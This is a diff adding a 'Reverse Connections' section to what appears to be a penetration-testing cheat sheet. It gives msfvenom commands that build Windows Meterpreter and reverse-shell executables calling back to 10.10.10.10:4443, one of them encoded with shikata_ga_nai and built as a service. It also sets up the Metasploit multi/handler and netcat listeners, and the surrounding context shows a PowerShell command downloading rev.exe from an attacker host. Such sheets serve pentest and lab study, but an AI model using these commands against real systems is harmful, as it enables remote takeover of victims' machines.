@@ -160,6 +160,36 @@ Download file in Batch Via Powershell Module
 powershell -command "Invoke-WebRequest -Uri 'http://10.10.167.187:8888/rev.exe' -OutFile '.\rev.exe'"
 ```
 
+## Reverse Connections 
+
+### Meterpreter
+
+**WINDOWS**
+Payload
+`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -o rev.exe`
+
+Run Listener on the background
+```
+meterpreter > background
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.10.10.10
+set LPORT 4443
+run -j
+```
+
+### Netcat Listener
+
+**WINDOWS**
+PAYLOAD
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o rev.exe` 
+```
+Run Listener on the background
+```
+nc -lvnp 4443
+```
+
 ## Privilege Escalation 
 
 ### Linux
